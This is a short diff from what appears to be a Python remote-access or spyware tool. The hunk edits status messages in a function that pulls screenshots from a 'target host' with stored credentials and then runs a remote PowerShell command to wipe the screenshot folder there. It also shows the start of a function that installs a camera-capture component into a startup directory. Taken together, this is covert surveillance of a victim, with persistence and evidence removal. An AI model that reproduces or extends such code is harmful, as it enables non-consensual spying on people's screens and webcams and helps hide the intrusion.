@@ -180,10 +180,10 @@ def fetch_screenshot(ipv4,pword,temp_path,uname):
     os.system(f"mkdir ~/Downloads/{ss_folder}")
     os.system(f"mv ~/Downloads/AbLtcVKTqN/* ~/Downloads/{ss_folder}")
     os.system("rm -rf ~/Downloads/AbLtcVKTqN")
-    print(f"[*] Screenshot saved at ~/Downloads folder...")
-    print("[+] Preparing to remove screenshots folder from target host...")
+    print(f"[+] Screenshots saved at ~/Downloads/{ss_folder} folder...")
+    print("[*] Preparing to remove screenshots folder from target host...")
     remote_command(ipv4,pword,f"powershell remove-item -path {temp_path}/AbLtcVKTqN -Force -recurse")
-    print("[*] Done. Folder wiped...")
+    print("[+] Done. Folder wiped...")
 
 def install_camcap(ipv4,pword,temp_dir,startup_dir):
     print("[+] Downloading...")
